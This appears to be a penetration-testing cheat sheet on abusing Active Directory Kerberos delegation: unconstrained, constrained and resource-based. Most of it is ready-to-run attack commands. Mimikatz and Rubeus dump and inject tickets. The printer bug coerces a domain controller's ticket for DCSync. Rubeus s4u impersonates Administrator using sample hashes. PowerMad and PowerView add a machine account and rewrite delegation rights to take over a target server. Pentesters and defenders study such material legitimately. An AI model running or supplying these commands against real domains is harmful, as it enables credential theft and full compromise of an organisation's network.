# Delegation & Resource-based Delegation

## <mark style="color:red;">Unconstrained Delegation</mark>

{% embed url="https://resources.infosecinstitute.com/topic/active-directory-series-unconstrained-delegation" %}

#### Unrestricted kerberos delegation is a privilege that can be assigned to a domain computer or a user. Usually, this privilege is given to computers  running services like IIS, MSSQL, etc. Those services usually require access to some back-end database (or some other server), so it can read/modify the database on the authenticated user's behalf.

When a user authenticates to a computer that has unresitricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. The reason TGTs get cached in memory is so the computer (with delegation rights) can impersonate the authenticated user as and when required for accessing any other services on that user's behalf. Essentially this looks like so:&#x20;

<mark style="color:green;">User ---> authenticates to ---> IIS server ---> authenticates on behalf of the user ---> DB server</mark>

```
# get tickets
privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export
Rubeus dump /service:krbtgt /nowrap
Rubeus dump /luid:0xdeadbeef /nowrap


# get unconstrained machines
Get-NetComputer -Unconstrained
Get-DomainComputer -Unconstrained -Properties DnsHostName
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

Unconstrained Delegation can be set on a _frontend service_ (e.g., an IIS web server) to allow it to delegate on behalf of a user to _any service in the domain_ (towards a _backend service_, such as an MSSQL database).

<mark style="color:green;">DACL UAC property:</mark> <mark style="color:green;"></mark><mark style="color:green;">`TrustedForDelegation`</mark><mark style="color:green;">.</mark>

### <mark style="color:orange;">Mimikatz</mark>

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation" %}

```
sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
```

### <mark style="color:orange;">Rubeus</mark>

```
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket:doIFSDCC[...]
```

We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.

On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.

```
.\Rubeus.exe monitor /interval:5 /nowrap
```

From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from [here](https://github.com/leechristensen/SpoolSample).

```powershell
.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com
```

The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).

```powershell
.\Rubeus.exe ptt /ticket:doIFxTCCBc...
```

## <mark style="color:red;">Constrained Delegation</mark>

```
# get tickets
privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export
Rubeus dump /service:krbtgt /nowrap
Rubeus dump /luid:0xdeadbeef /nowrap

# get constrained delegation machines
Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
MATCH (u:User {owned:true}), (c:Computer {name: "<MYTARGET.FQDN>"}), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

#### Constrained delegation can be set on the _frontend server_ (e.g. IIS) to allow it to delegate to _only selected backend services_ (e.g. MSSQL) on behalf of the user.

<mark style="color:green;">DACL UAC property:</mark> <mark style="color:green;">`TrustedToAuthForDelegation`</mark>.&#x20;

This allows `s4u2self`, i.e. requesting a TGS on behalf of _anyone_ to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn’t used between the user and frontend.

<mark style="color:green;">DACL Property:</mark> <mark style="color:green;"></mark><mark style="color:green;">`msDS-AllowedToDelegateTo`</mark>.&#x20;

This property contains the SPNs it is allowed to use `s4u2proxy` on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using `s4u2self`). This effectively defines the backend services that constrained delegation is allowed for.

{% hint style="info" %}
These properties do NOT have to exist together!&#x20;

If `s4u2proxy` is allowed without `s4u2self`, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.
{% endhint %}

### <mark style="color:orange;">Rubeus</mark>

In this case, we use Rubeus to automatically request a TGT and then a TGS with the `ldap` SPN to allow us to DCSync using a machine account.

```
# Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt

# Same as the two above steps, but access the LDAP service on the DC instead (for dcsync)
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```

### <mark style="color:orange;">Computer Account</mark>

If you have compromised a machine account or in other words you have a SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.

Using powerview, we can find target computers like so:

```
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
```

impersonate the administrator account:

```
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

ls \\dc01.offense.local\c$
```

## <mark style="color:red;">Resource-based constrained delegation  (RBCD)</mark> <a href="#resource-based-constrained-delegation" id="resource-based-constrained-delegation"></a>

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" %}

### <mark style="color:orange;">Kerberos Delegation vs Resource Based Kerberos Delegation</mark>

* In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
* In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.

```
rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>
getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>

rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

**Resource-Based Constrained Delegation (RBCD) configures the **_**backend server**_** (e.g. MSSQL) to allow **_**only selected frontend services**_** (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.**

<mark style="color:green;">DACL Property:</mark> <mark style="color:green;"></mark><mark style="color:green;">`msDS-AllowedToActOnBehalfOfOtherIdentity`</mark><mark style="color:green;">.</mark>

In this scenario, `s4u2self` and `s4u2proxy` are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the _frontend service_) is present in the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the _backend service_. This means that the _frontend service_ needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.

### <mark style="color:orange;">**Exploitation**</mark>

#### If we compromise a _frontend service_ that appears in the RBCD property of a _backend service_, exploitation is the same as with constrained delegation above. This is however not too common.

A more often-seen attack to RBCD is when we have `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.

```
# Create a new machine account using PowerMad
import-module powermad
New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)

# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target
$sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target
Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target
.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt
```
